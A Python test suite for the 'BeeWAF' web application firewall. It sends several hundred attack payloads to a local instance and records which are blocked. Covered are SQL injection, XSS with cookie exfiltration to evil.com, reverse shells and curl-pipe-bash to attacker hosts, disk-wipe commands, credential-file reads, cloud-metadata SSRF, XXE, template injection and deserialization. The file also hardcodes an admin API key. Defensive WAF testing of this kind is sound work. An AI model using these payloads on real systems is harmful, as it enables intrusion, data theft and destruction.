#!/usr/bin/env python3
"""
BeeWAF 10,000+ Rules - MEGA Comprehensive Test Suite
=====================================================
Tests ALL attack categories against the WAF with 10,038 compiled rules.
Covers: SQLi, XSS, CMDi, Path Traversal, SSRF, XXE, SSTI, Deserialization,
        File Upload, CRLF, LFI/RFI, LDAP, XPath, NoSQL, GraphQL, WebSocket,
        CORS, JWT, CVE-specific, WAF bypass, encoding evasion, and more.

Also tests legitimate traffic for FALSE POSITIVE verification.
"""

import requests
import urllib.parse
import time
import sys
import json
from collections import defaultdict
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAF_URL = "https://127.0.0.1"
API_KEY = "supersecret-beewaf-admin-key-2026"

# ─── Counters ───
stats = defaultdict(lambda: {"total": 0, "blocked": 0, "passed": 0})
global_blocked = 0
global_total = 0
false_positives = 0
fp_details = []

def send(method, path, body=None, headers=None, category="unknown", expect_block=True, desc=""):
    """Send request and check if WAF blocks it."""
    global global_blocked, global_total, false_positives
    global_total += 1
    stats[category]["total"] += 1

    url = WAF_URL + path
    hdrs = {
        "X-API-Key": API_KEY,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    if headers:
        hdrs.update(headers)

    sys.stdout.write(f"\n  [{global_total:3d}] {category:20s} {desc:40s}")
    sys.stdout.flush()

    try:
        if method == "GET":
            r = requests.get(url, headers=hdrs, timeout=30, allow_redirects=False, verify=False)
        elif method == "POST":
            if isinstance(body, dict):
                r = requests.post(url, json=body, headers=hdrs, timeout=30, allow_redirects=False, verify=False)
            else:
                hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
                r = requests.post(url, data=body, headers=hdrs, timeout=30, allow_redirects=False, verify=False)
        elif method == "PUT":
            r = requests.put(url, data=body, headers=hdrs, timeout=30, allow_redirects=False, verify=False)
        elif method == "DELETE":
            r = requests.delete(url, headers=hdrs, timeout=30, allow_redirects=False, verify=False)
        elif method == "PATCH":
            r = requests.patch(url, data=body, headers=hdrs, timeout=30, allow_redirects=False, verify=False)
        else:
            r = requests.request(method, url, data=body, headers=hdrs, timeout=30, allow_redirects=False, verify=False)

        blocked = r.status_code == 403
    except requests.exceptions.ConnectionError as e:
        blocked = False
        sys.stdout.write(f" CONN_ERR")
    except requests.exceptions.ReadTimeout:
        blocked = False
        sys.stdout.write(f" TIMEOUT")
    except Exception as e:
        blocked = False
        sys.stdout.write(f" ERR:{type(e).__name__}")

    if blocked:
        global_blocked += 1
        stats[category]["blocked"] += 1
    else:
        stats[category]["passed"] += 1
        if expect_block:
            try:
                sys.stdout.write(f" MISS:{r.status_code}")
            except:
                pass

    if expect_block and not blocked:
        pass  # Missed attack
    elif not expect_block and blocked:
        false_positives += 1
        fp_details.append(f"  FP: [{category}] {method} {path} - {desc}")

    # Small delay to avoid triggering DDoS protection
    time.sleep(0.05)

    return blocked


def section(name):
    print(f"\n{'='*70}")
    print(f"  TESTING: {name}")
    print(f"{'='*70}")


# ═══════════════════════════════════════════════════════════════════════
# 1. SQL INJECTION (50 tests)
# ═══════════════════════════════════════════════════════════════════════
section("SQL INJECTION")
cat = "SQLi"

# Classic
send("GET", "/search?q=' OR 1=1--", category=cat, desc="Classic OR 1=1")
send("GET", "/search?q=' OR '1'='1", category=cat, desc="String OR bypass")
send("GET", "/search?id=1 UNION SELECT username,password FROM users--", category=cat, desc="UNION SELECT")
send("GET", "/search?q='; DROP TABLE users;--", category=cat, desc="DROP TABLE")
send("POST", "/login", body="username=admin'--&password=x", category=cat, desc="Login bypass")
send("GET", "/search?q=' AND 1=1--", category=cat, desc="AND 1=1")
send("GET", "/search?q=' AND (SELECT COUNT(*) FROM users)>0--", category=cat, desc="Subquery count")
send("GET", "/item?id=1; EXEC xp_cmdshell('whoami')", category=cat, desc="xp_cmdshell")

# Blind SQLi
send("GET", "/search?q=' AND SLEEP(5)--", category=cat, desc="Time-based blind")
send("GET", "/search?q=' AND BENCHMARK(10000000,SHA1('test'))--", category=cat, desc="BENCHMARK blind")
send("GET", "/search?q=' AND IF(1=1,SLEEP(3),0)--", category=cat, desc="IF SLEEP")
send("GET", "/search?q=1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--", category=cat, desc="Blind substring")
send("GET", "/search?q=' WAITFOR DELAY '0:0:5'--", category=cat, desc="WAITFOR DELAY")

# Error-based
send("GET", "/search?q=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", category=cat, desc="EXTRACTVALUE")
send("GET", "/search?q=' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--", category=cat, desc="UPDATEXML")
send("GET", "/search?q=' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", category=cat, desc="Error floor")

# UNION variants
send("GET", "/search?q=-1 UNION ALL SELECT NULL,NULL,NULL--", category=cat, desc="UNION ALL NULL")
send("GET", "/search?q=1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables--", category=cat, desc="information_schema")
send("GET", "/search?q=' UNION SELECT username||':'||password FROM users--", category=cat, desc="Concat columns")

# Stacked queries
send("GET", "/search?q=1; INSERT INTO users VALUES('hacker','pass')--", category=cat, desc="Stacked INSERT")
send("GET", "/search?q=1; UPDATE users SET role='admin' WHERE id=1--", category=cat, desc="Stacked UPDATE")
send("GET", "/search?q=1; DELETE FROM logs--", category=cat, desc="Stacked DELETE")

# NoSQL injection
send("POST", "/login", body='{"username":{"$ne":""},"password":{"$ne":""}}', headers={"Content-Type": "application/json"}, category=cat, desc="NoSQL $ne")
send("POST", "/login", body='{"username":{"$gt":""},"password":{"$gt":""}}', headers={"Content-Type": "application/json"}, category=cat, desc="NoSQL $gt")
send("POST", "/search", body='{"query":{"$where":"this.password.match(/.*/)!=null"}}', headers={"Content-Type": "application/json"}, category=cat, desc="NoSQL $where")
send("GET", "/api/users?filter[$regex]=admin", category=cat, desc="NoSQL $regex")

# Advanced evasion
send("GET", "/search?q=1'%09OR%091=1--", category=cat, desc="Tab evasion")
send("GET", "/search?q=1'/**/OR/**/1=1--", category=cat, desc="Comment evasion")
send("GET", "/search?q=1' oR 1=1--", category=cat, desc="Case mixing")
send("GET", "/search?q=%27%20OR%201%3D1--", category=cat, desc="URL encoded")
send("GET", "/search?q=1' OR 1=1%00--", category=cat, desc="Null byte")

# Database-specific
send("GET", "/search?q=' AND pg_sleep(5)--", category=cat, desc="PostgreSQL pg_sleep")
send("GET", "/search?q='; COPY users TO '/tmp/out'--", category=cat, desc="PostgreSQL COPY")
send("GET", "/search?q=' AND UTL_INADDR.get_host_address('attacker.com')--", category=cat, desc="Oracle UTL_INADDR")
send("GET", "/search?q=' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", category=cat, desc="Oracle DBMS_PIPE")

# ORM injection
send("GET", "/search?q=__proto__[isAdmin]=true", category=cat, desc="Prototype pollution")
send("GET", "/api?filter[where][role]=admin", category=cat, desc="ORM filter bypass")

# Second-order
send("POST", "/register", body="username=admin'--&email=test@test.com", category=cat, desc="Stored SQLi in registration")

# Additional
send("GET", "/search?q=1' ORDER BY 10--", category=cat, desc="ORDER BY enumeration")
send("GET", "/search?q=' HAVING 1=1--", category=cat, desc="HAVING injection")
send("GET", "/search?q=1' GROUP BY 1--", category=cat, desc="GROUP BY injection")
send("GET", "/search?q=1; SHOW TABLES--", category=cat, desc="SHOW TABLES")
send("GET", "/search?q=1; SHOW DATABASES--", category=cat, desc="SHOW DATABASES")
send("GET", "/search?q=1' INTO OUTFILE '/tmp/test'--", category=cat, desc="INTO OUTFILE")
send("GET", "/search?q=1' INTO DUMPFILE '/tmp/test'--", category=cat, desc="INTO DUMPFILE")
send("GET", "/search?q=1 UNION SELECT LOAD_FILE('/etc/passwd')--", category=cat, desc="LOAD_FILE")
send("GET", "/search?q=admin'%23", category=cat, desc="MySQL comment bypass #")
send("GET", "/search?q=' OR ''='", category=cat, desc="Empty string bypass")
send("GET", "/search?q=' OR 'x'='x", category=cat, desc="String equality bypass")
send("GET", "/search?q=1; GRANT ALL ON *.* TO 'hacker'@'%'--", category=cat, desc="GRANT privileges")
print(f"  SQLi: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 2. CROSS-SITE SCRIPTING (40 tests)
# ═══════════════════════════════════════════════════════════════════════
section("CROSS-SITE SCRIPTING")
cat = "XSS"

send("GET", "/search?q=<script>alert(1)</script>", category=cat, desc="Basic script tag")
send("GET", "/search?q=<img src=x onerror=alert(1)>", category=cat, desc="img onerror")
send("GET", "/search?q=<svg onload=alert(1)>", category=cat, desc="svg onload")
send("GET", "/search?q=<body onload=alert(1)>", category=cat, desc="body onload")
send("GET", "/search?q=<input onfocus=alert(1) autofocus>", category=cat, desc="input onfocus")
send("GET", "/search?q=<marquee onstart=alert(1)>", category=cat, desc="marquee onstart")
send("GET", "/search?q=<details open ontoggle=alert(1)>", category=cat, desc="details ontoggle")
send("GET", "/search?q=<iframe src=javascript:alert(1)>", category=cat, desc="iframe javascript")
send("GET", '/search?q=<a href="javascript:alert(1)">click</a>', category=cat, desc="a href javascript")
send("GET", "/search?q=<div style='background:url(javascript:alert(1))'>", category=cat, desc="CSS javascript")
send("GET", '/search?q="><script>alert(document.cookie)</script>', category=cat, desc="Cookie steal")
send("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", category=cat, desc="URL encoded XSS")
send("GET", "/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>", category=cat, desc="Cookie exfil")
send("GET", "/search?q=<img src=x onerror=fetch('http://evil.com/'+document.cookie)>", category=cat, desc="Fetch exfil")
send("POST", "/comment", body="text=<script>alert('XSS')</script>", category=cat, desc="Stored XSS POST")
send("GET", "/search?q=javascript:alert(1)//", category=cat, desc="javascript: URI")
send("GET", "/search?q=<svg/onload=alert(1)>", category=cat, desc="SVG no space")
send("GET", "/search?q=<img src=x onerror=alert`1`>", category=cat, desc="Template literal")
send("GET", "/search?q=<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img onerror=alert(1) src>", category=cat, desc="Math mutation")
send("GET", "/search?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt;", category=cat, desc="HTML entity encoded")
send("GET", "/search?q=<scr<script>ipt>alert(1)</scr</script>ipt>", category=cat, desc="Nested tags")
send("GET", "/search?q=<SCRIPT>alert(1)</SCRIPT>", category=cat, desc="Uppercase")
send("GET", "/search?q=<ScRiPt>alert(1)</ScRiPt>", category=cat, desc="Mixed case")
send("GET", '/search?q="-prompt(1)-"', category=cat, desc="Prompt function")
send("GET", "/search?q=<video src=x onerror=alert(1)>", category=cat, desc="video onerror")
send("GET", "/search?q=<audio src=x onerror=alert(1)>", category=cat, desc="audio onerror")
send("GET", "/search?q=<object data=javascript:alert(1)>", category=cat, desc="object data javascript")
send("GET", "/search?q=<embed src=javascript:alert(1)>", category=cat, desc="embed javascript")
send("GET", "/search?q=<meta http-equiv=refresh content='0;url=javascript:alert(1)'>", category=cat, desc="meta refresh XSS")
send("GET", "/search?q=<form action=javascript:alert(1)><input type=submit>", category=cat, desc="form action javascript")
send("GET", "/search?q=<base href='javascript:alert(1)//'>", category=cat, desc="base href")
send("GET", "/search?q=<link rel=import href='javascript:alert(1)'>", category=cat, desc="link import")
send("GET", "/search?q=<isindex action=javascript:alert(1)>", category=cat, desc="isindex")
send("GET", "/search?q=<xss style='behavior:url(#default#time2)' onbegin='alert(1)'>", category=cat, desc="behavior CSS")
send("GET", "/search?q=<x contenteditable onblur=alert(1)>lose focus!", category=cat, desc="contenteditable")
send("GET", "/search?q=<svg><animate onbegin=alert(1)>", category=cat, desc="SVG animate")
send("GET", "/search?q=<svg><set onbegin=alert(1)>", category=cat, desc="SVG set")
send("GET", "/search?q=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", category=cat, desc="Data URI base64")
send("GET", '/search?q=<div onpointerover="alert(1)">hover</div>', category=cat, desc="pointer event")
send("GET", "/search?q=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", category=cat, desc="eval atob XSS")
print(f"  XSS: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 3. COMMAND INJECTION (30 tests)
# ═══════════════════════════════════════════════════════════════════════
section("COMMAND INJECTION")
cat = "CMDi"

send("GET", "/ping?host=;id", category=cat, desc="Semicolon id")
send("GET", "/ping?host=|cat /etc/passwd", category=cat, desc="Pipe cat passwd")
send("GET", "/ping?host=`whoami`", category=cat, desc="Backtick whoami")
send("GET", "/ping?host=$(cat /etc/shadow)", category=cat, desc="$() shadow")
send("POST", "/upload", body="file=;wget http://evil.com/shell.sh", category=cat, desc="wget shell")
send("GET", "/ping?host=127.0.0.1%0a cat /etc/passwd", category=cat, desc="Newline injection")
send("GET", "/ping?host=127.0.0.1 && ls -la /", category=cat, desc="&& ls")
send("GET", "/ping?host=127.0.0.1 || cat /etc/passwd", category=cat, desc="|| cat passwd")
send("POST", "/api/exec", body="cmd=rm -rf /", category=cat, desc="rm -rf /")
send("GET", "/search?q=;nc -e /bin/sh attacker.com 4444", category=cat, desc="Netcat reverse shell")
send("GET", "/search?q=;python -c 'import socket;...'", category=cat, desc="Python reverse shell")
send("GET", "/search?q=;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", category=cat, desc="Bash reverse shell")
send("GET", "/search?q=;perl -e 'use Socket;...'", category=cat, desc="Perl reverse shell")
send("GET", "/search?q=;ruby -rsocket -e 'f=TCPSocket...'", category=cat, desc="Ruby reverse shell")
send("GET", "/search?q=;curl http://evil.com/shell|bash", category=cat, desc="Curl pipe bash")
send("GET", "/search?q=;chmod 777 /etc/passwd", category=cat, desc="chmod passwd")
send("GET", "/search?q=;chown root:root /tmp/backdoor", category=cat, desc="chown root")
send("GET", "/search?q=;useradd -o -u 0 hacker", category=cat, desc="useradd root uid")
send("GET", "/search?q=;crontab -l", category=cat, desc="Crontab list")
send("GET", "/search?q=;echo 'hacker::0:0::/root:/bin/bash'>>/etc/passwd", category=cat, desc="Append passwd")
send("GET", "/search?q=%7Cid", category=cat, desc="URL encoded pipe")
send("GET", "/search?q=%3Bwhoami", category=cat, desc="URL encoded semicolon")
send("POST", "/api/cmd", body="input=;/usr/bin/python3 -c 'import os;os.system(\"id\")'", category=cat, desc="Python os.system")
send("POST", "/api/cmd", body="input=;nmap -sS target.com", category=cat, desc="Nmap scan")
send("POST", "/api/cmd", body="input=;cat /proc/self/environ", category=cat, desc="Read environ")
send("GET", "/search?q=;dd if=/dev/zero of=/dev/sda", category=cat, desc="Disk wipe dd")
send("GET", "/search?q=;mkfs.ext4 /dev/sda", category=cat, desc="Format disk")
send("GET", "/search?q=;iptables -F", category=cat, desc="Flush iptables")
send("GET", "/search?q=;echo c > /proc/sysrq-trigger", category=cat, desc="SysRq crash")
send("GET", "/search?q=;poweroff", category=cat, desc="Poweroff")
print(f"  CMDi: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 4. PATH TRAVERSAL / LFI / RFI (30 tests)
# ═══════════════════════════════════════════════════════════════════════
section("PATH TRAVERSAL / LFI / RFI")
cat = "PathTraversal"

send("GET", "/file?path=../../../etc/passwd", category=cat, desc="Classic ../ passwd")
send("GET", "/file?path=....//....//....//etc/passwd", category=cat, desc="Double dot bypass")
send("GET", "/file?path=..%2f..%2f..%2fetc%2fpasswd", category=cat, desc="URL encoded ../")
send("GET", "/file?path=..%252f..%252f..%252fetc%252fpasswd", category=cat, desc="Double encoded")
send("GET", "/file?path=....\\....\\....\\windows\\system32\\config\\sam", category=cat, desc="Windows SAM")
send("GET", "/file?path=/etc/shadow", category=cat, desc="Direct /etc/shadow")
send("GET", "/file?path=/etc/passwd", category=cat, desc="Direct /etc/passwd")
send("GET", "/file?path=/proc/self/environ", category=cat, desc="/proc/self/environ")
send("GET", "/file?path=/proc/self/cmdline", category=cat, desc="/proc/self/cmdline")
send("GET", "/file?path=/var/log/auth.log", category=cat, desc="Auth log")
send("GET", "/file?path=php://filter/convert.base64-encode/resource=/etc/passwd", category=cat, desc="PHP filter")
send("GET", "/file?path=php://input", category=cat, desc="PHP input wrapper")
send("GET", "/file?path=expect://id", category=cat, desc="Expect wrapper")
send("GET", "/file?path=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", category=cat, desc="Data wrapper")
send("GET", "/file?path=file:///etc/passwd", category=cat, desc="File URI scheme")
send("GET", "/file?path=http://evil.com/shell.php", category=cat, desc="RFI http")
send("GET", "/file?path=https://evil.com/malware.php", category=cat, desc="RFI https")
send("GET", "/file?path=ftp://evil.com/shell.txt", category=cat, desc="RFI ftp")
send("GET", "/file?path=\\\\evil.com\\share\\shell.php", category=cat, desc="UNC path")
send("GET", "/file?path=%00../../etc/passwd", category=cat, desc="Null byte bypass")
send("GET", "/file?path=....//....//etc/passwd%00.jpg", category=cat, desc="Null byte extension")
send("GET", "/static/..%c0%af..%c0%af..%c0%afetc/passwd", category=cat, desc="UTF-8 overlong")
send("GET", "/static/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", category=cat, desc="Unicode fullwidth")
send("GET", "/file?path=/var/run/secrets/kubernetes.io/serviceaccount/token", category=cat, desc="K8s token")
send("GET", "/file?path=/.env", category=cat, desc=".env file")
send("GET", "/file?path=/app/.git/config", category=cat, desc="Git config")
send("GET", "/file?path=/.aws/credentials", category=cat, desc="AWS creds")
send("GET", "/file?path=C:\\Windows\\win.ini", category=cat, desc="Windows win.ini")
send("GET", "/file?path=C:\\boot.ini", category=cat, desc="Windows boot.ini")
send("GET", "/file?path=..\\..\\..\\..\\windows\\system.ini", category=cat, desc="Windows system.ini")
print(f"  PathTraversal: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 5. SERVER-SIDE REQUEST FORGERY (25 tests)
# ═══════════════════════════════════════════════════════════════════════
section("SERVER-SIDE REQUEST FORGERY")
cat = "SSRF"

send("GET", "/proxy?url=http://169.254.169.254/latest/meta-data/", category=cat, desc="AWS metadata")
send("GET", "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", category=cat, desc="AWS IAM creds")
send("GET", "/proxy?url=http://metadata.google.internal/computeMetadata/v1/", category=cat, desc="GCP metadata")
send("GET", "/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01", category=cat, desc="Azure metadata")
send("GET", "/proxy?url=http://127.0.0.1:22", category=cat, desc="Localhost port scan")
send("GET", "/proxy?url=http://localhost:6379/", category=cat, desc="Redis localhost")
send("GET", "/proxy?url=http://0.0.0.0:8080", category=cat, desc="0.0.0.0")
send("GET", "/proxy?url=http://[::1]:80", category=cat, desc="IPv6 localhost")
send("GET", "/proxy?url=http://0177.0.0.1/", category=cat, desc="Octal IP")
send("GET", "/proxy?url=http://0x7f000001/", category=cat, desc="Hex IP")
send("GET", "/proxy?url=http://2130706433/", category=cat, desc="Decimal IP")
send("GET", "/proxy?url=http://127.0.0.1.nip.io/admin", category=cat, desc="DNS rebinding nip.io")
send("GET", "/proxy?url=http://internal-service.local/", category=cat, desc="Internal DNS")
send("GET", "/proxy?url=http://192.168.1.1/admin", category=cat, desc="Private network")
send("GET", "/proxy?url=http://10.0.0.1/", category=cat, desc="10.x private")
send("GET", "/proxy?url=http://172.16.0.1/", category=cat, desc="172.16 private")
send("GET", "/proxy?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall", category=cat, desc="Gopher Redis")
send("GET", "/proxy?url=dict://127.0.0.1:6379/info", category=cat, desc="Dict protocol")
send("GET", "/proxy?url=file:///etc/passwd", category=cat, desc="File scheme SSRF")
send("GET", "/proxy?url=http://169.254.169.254/latest/user-data", category=cat, desc="AWS user-data")
send("POST", "/api/webhook", body="url=http://169.254.169.254/", category=cat, desc="Webhook SSRF")
send("GET", "/proxy?url=http://100.100.100.200/latest/meta-data/", category=cat, desc="Alibaba metadata")
send("GET", "/proxy?url=http://169.254.170.2/v2/credentials", category=cat, desc="ECS task creds")
send("GET", "/proxy?url=jar:http://evil.com/evil.jar!/test.txt", category=cat, desc="Jar protocol")
send("GET", "/proxy?url=http://0:8080/admin", category=cat, desc="Zero IP")
print(f"  SSRF: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 6. XXE - XML EXTERNAL ENTITY (20 tests)
# ═══════════════════════════════════════════════════════════════════════
section("XXE - XML EXTERNAL ENTITY")
cat = "XXE"

send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="Classic XXE /etc/passwd")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE SSRF")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>test</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="OOB XXE")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE expect")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE PHP filter")
send("POST", "/api/xml", body='<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>', headers={"Content-Type": "text/xml"}, category=cat, desc="XXE shadow")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;">]><lolz>&lol4;</lolz>', headers={"Content-Type": "application/xml"}, category=cat, desc="Billion laughs DoS")
send("POST", "/api/upload", body='<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg>&xxe;</svg>', headers={"Content-Type": "image/svg+xml"}, category=cat, desc="SVG XXE")
send("POST", "/api/xml", body='<!DOCTYPE foo SYSTEM "http://evil.com/external.dtd"><foo>bar</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="External DTD")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;%int;%trick;]><foo>test</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="Parameter entity OOB")
send("POST", "/api/soap", body='<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data></soap:Body></soap:Envelope>', headers={"Content-Type": "text/xml"}, category=cat, desc="SOAP XXE")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE Windows")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE netdoc")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE jar")

# XSLT injection
send("POST", "/api/xml", body='<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'file:///etc/passwd\')"/></xsl:template></xsl:stylesheet>', headers={"Content-Type": "application/xml"}, category=cat, desc="XSLT file read")
send("POST", "/api/xml", body='<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template><xsl:copy-of select="document(\'http://evil.com\')"/></xsl:template></xsl:stylesheet>', headers={"Content-Type": "application/xml"}, category=cat, desc="XSLT SSRF")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE gopher Redis")
send("POST", "/api/xml", body='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE data URI")
send("POST", "/api/xml", body='<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/dev/random">]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"}, category=cat, desc="XXE DoS /dev/random")
send("POST", "/api/xml", body='<methodCall><methodName>system.listMethods</methodName><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><params><param><value>&xxe;</value></param></params></methodCall>', headers={"Content-Type": "text/xml"}, category=cat, desc="XML-RPC XXE")
print(f"  XXE: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 7. SERVER-SIDE TEMPLATE INJECTION (20 tests)
# ═══════════════════════════════════════════════════════════════════════
section("SERVER-SIDE TEMPLATE INJECTION")
cat = "SSTI"

send("GET", "/search?q={{7*7}}", category=cat, desc="Basic Jinja2 eval")
send("GET", "/search?q={{config.items()}}", category=cat, desc="Jinja2 config dump")
send("GET", "/search?q={{''.__class__.__mro__[2].__subclasses__()}}", category=cat, desc="Jinja2 class chain")
send("GET", "/search?q={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", category=cat, desc="Jinja2 RCE")
send("GET", "/search?q=${7*7}", category=cat, desc="FreeMarker/EL eval")
send("GET", "/search?q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}", category=cat, desc="FreeMarker Execute")
send("GET", "/search?q=#{7*7}", category=cat, desc="Ruby ERB eval")
send("GET", "/search?q=<%= system('id') %>", category=cat, desc="ERB system call")
send("GET", "/search?q=${T(java.lang.Runtime).getRuntime().exec('id')}", category=cat, desc="SpEL RCE")
send("POST", "/template", body="name={% import os %}{{ os.popen('id').read() }}", category=cat, desc="Jinja2 import os")
send("GET", "/search?q={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", category=cat, desc="Jinja2 advanced chain")
send("GET", "/search?q=*{T(java.lang.Runtime).getRuntime().exec('whoami')}", category=cat, desc="Thymeleaf SpEL")
send("GET", "/search?q={{lipsum.__globals__['os'].popen('id').read()}}", category=cat, desc="Jinja2 lipsum")
send("GET", "/search?q={{namespace.__init__.__globals__.os.popen('whoami').read()}}", category=cat, desc="Jinja2 namespace")
send("GET", "/search?q=${\"freemarker.template.utility.Execute\"?new()(\"id\")}", category=cat, desc="FreeMarker new()")
send("GET", "/search?q=#{\"test\".class.forName(\"java.lang.Runtime\")}", category=cat, desc="EL Runtime class")
send("GET", "/search?q=@(1+2)", category=cat, desc="Razor evaluation")
send("GET", "/search?q={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()\n}}", category=cat, desc="Pug/Jade RCE")
send("GET", "/search?q={php}echo `id`;{/php}", category=cat, desc="Smarty PHP tag")
send("GET", "/search?q={{['id']|filter('system')}}", category=cat, desc="Twig filter system")
print(f"  SSTI: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 8. DESERIALIZATION ATTACKS (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("DESERIALIZATION")
cat = "Deserialization"

send("POST", "/api/data", body='O:11:"Application":1:{s:4:"exec";s:6:"whoami";}', category=cat, desc="PHP serialize")
send("POST", "/api/data", body="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", category=cat, desc="Java rO0 base64")
send("POST", "/api/data", body='{"__class__": "subprocess.Popen", "args": ["id"]}', headers={"Content-Type": "application/json"}, category=cat, desc="Python pickle-like")
send("POST", "/api/data", body='a]>aced0005', category=cat, desc="Java magic bytes")
send("POST", "/api/data", body='{"$type": "System.Diagnostics.Process", "StartInfo": {"FileName": "cmd.exe"}}', headers={"Content-Type": "application/json"}, category=cat, desc=".NET TypeNameHandling")
send("POST", "/api/data", body='yaml.load("!!python/object/apply:os.system [\'id\']")', category=cat, desc="PyYAML unsafe")
send("POST", "/api/data", body="!!python/object/apply:os.popen ['id']", headers={"Content-Type": "application/x-yaml"}, category=cat, desc="YAML deserialization")
send("POST", "/api/data", body='{"__proto__": {"isAdmin": true}}', headers={"Content-Type": "application/json"}, category=cat, desc="Prototype pollution")
send("POST", "/api/data", body='{"constructor": {"prototype": {"isAdmin": true}}}', headers={"Content-Type": "application/json"}, category=cat, desc="Constructor pollution")
